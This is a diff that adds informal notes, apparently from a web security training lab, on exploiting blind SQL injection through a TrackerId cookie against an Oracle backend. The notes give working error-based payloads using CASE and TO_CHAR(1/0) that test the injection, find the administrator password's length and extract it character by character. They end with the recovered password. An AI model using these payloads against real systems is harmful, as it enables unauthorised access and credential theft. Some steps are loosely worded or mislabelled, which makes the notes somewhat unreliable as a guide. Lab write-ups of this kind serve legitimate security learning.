@@ -1,0 +1,36 @@
+1) take a request and change the cookie TrackerId to 
+...' || (SELECT '' FROM dual) --
+
+we can see here that it works
+
+...' || (SELECT '' FROM fake_table) --
+this triggers an error and the server responds with an internal server error
+
+
+
+2) we try to see if we are able to raise an exception when our select is ok
+' || (SELECT CASE WHEN ('1'='1') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
+in this case the server responds with an internal error server because '1'='1' and the query triggers TO_CHAR(1/0) that generates an error
+
+' || (SELECT CASE WHEN ('1'='0') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
+it is ok because we don't have errors in fact '1' != '0'
+
+2)
+
+LENGTH of password:
+' || (SELECT CASE WHEN length(password)=2 THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')--
+
+        NOTE: "administrator doesn't work
+
+
+then we fuzz the 1 from 1 to 25 and we get that the password has length 20 because we obtain INTERNAL SERVER ERROR
+
+
+3) now  we can use substring to retrieve the password
+
+' || (SELECT CASE WHEN (substr(password, 1, 1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')--
+
+and we fuzz the first 1 from 1 to 20 and the char 'a' from a-z and 0-9 
+
+
+pass: 5d8fduncsw63lklw9l4z
